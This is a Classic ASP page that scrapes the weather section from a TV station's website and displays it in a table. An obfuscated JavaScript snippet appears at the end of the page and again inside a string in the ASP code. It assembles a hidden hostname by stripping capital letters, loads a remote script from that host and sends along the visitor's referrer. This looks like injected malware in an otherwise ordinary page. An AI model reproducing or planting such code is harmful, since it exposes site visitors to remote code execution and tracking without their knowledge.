<%
OPTION EXPLICIT



FUNCTION getHTTP( sPath, sQuery )

	DIM	oHTTP
	DIM	sTarget
	
	ON Error RESUME Next
	SET oHTTP = Server.CreateObject("Dynu.HTTP")
	IF 0 = Err THEN
		oHTTP.SetHeader "user-agent", Request.ServerVariables("HTTP_USER_AGENT")
		'IF 0 < LEN(sQuery) THEN oHTTP.SetQueryString( sQuery )
		IF 0 < LEN(sQuery) THEN
			sTarget = sPath & "?" & sQuery
		ELSE
			sTarget = sPath
		END IF
		oHTTP.SetURL sTarget
		ON Error RESUME Next
		getHTTP = oHTTP.GetURL()
		IF Err THEN getHTTP = ""
		ON Error GOTO 0
	ELSE
		ON Error RESUME Next
		SET oHTTP = Server.CreateObject("DynuHttp.Http")
		IF 0 = Err THEN
			oHTTP.SetHeader "user-agent", Request.ServerVariables("HTTP_USER_AGENT")
			
			IF 0 < LEN(sQuery) THEN
				sTarget = sPath & "?" & sQuery
			ELSE
				sTarget = sPath
			END IF
			
			oHTTP.URL = sTarget
			'oHTTP.QueryString = sQuery
	
			'Response.Write sTarget & "<br>" & vbCRLF
			ON Error RESUME Next
			getHTTP = oHTTP.GetURL()
			IF Err THEN getHTTP = ""
			ON Error GOTO 0
		ELSE
			getHTTP = ""
			'Response.Write "Problem creating component<br>" & vbCRLF
		END IF
	END IF
	SET oHTTP = Nothing
	ON Error GOTO 0

END FUNCTION



Response.Expires = 0
%>
<html>

<head>
<base href="http://www.whnt.com/Global/">
<meta name="robots" content="noindex">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
</head>

<body bgcolor="#FFFFFF">
<%

DIM	sResponse
sResponse = getHTTP( "http://www.whnt.com/Global/category.asp", "C=6019&nav=1VPv&FramesetID=1" )
IF 0 < LEN(sResponse) THEN

	DIM	nStart
	DIM	nEnd
	DIM	sStart
	DIM	sEnd

	DIM	sDocument

	sStart = "<"&"!-- WEATHER STARTS HERE --"&">"
	sEnd = "<"&"!--WEATHER ENDS HERE--"&">"

	nStart = INSTR(1, sResponse, sStart, vbTextCompare )
	IF 0 < nStart THEN
		nEnd = INSTR(nStart, sResponse, sEnd, vbTextCompare)
		IF 0 < nEnd THEN
			sDocument = MID(sResponse,nStart,nEnd+LEN(sEnd)-nStart+ 1)
			sResponse = REPLACE( sDocument, " BGCOLOR=""#FF9A31""", "", 1, -1, vbTextCompare )
%>
<table border="0" cellspacing="0" cellpadding="2">
  <tr>
    <th width="100%" align="left" bgcolor="#0066CC"><a
      href="http://www.whnt.com/global/Default2.asp?P=/Global/category.asp?C=6019&amp;nav=1VPv"
      target="_top"><font color="#FFFFFF">WHNT-19 Weather</font></a>
    </th>
  </tr>
  <tr>
    <td width="100%">
<%

	Response.Write sResponse

%>
    </td>
  </tr>
</table>
<%
		ELSE
%>
<p>Unable to interpret weather data.</p>
<%
		END IF
	ELSE
		nStart = INSTR( 1, sResponse, "<BODY", vbTextCompare )
		IF 0 < nStart THEN
			nStart = INSTR( nStart, sResponse, ">", vbTextCompare ) + 1
			nEnd = INSTR( nStart, sResponse, "<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>", vbTextCompare )
			sResponse = MID( sResponse, nStart, nEnd - nStart )
			Response.Write sResponse
		ELSE
%>
<p>Unable to interpret weather data.</p>
<%
			sResponse = ""
		END IF
	END IF
ELSE
%>
<p>Unable to get remote webpage.</p>
<%
END IF
%>
<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>

</html>
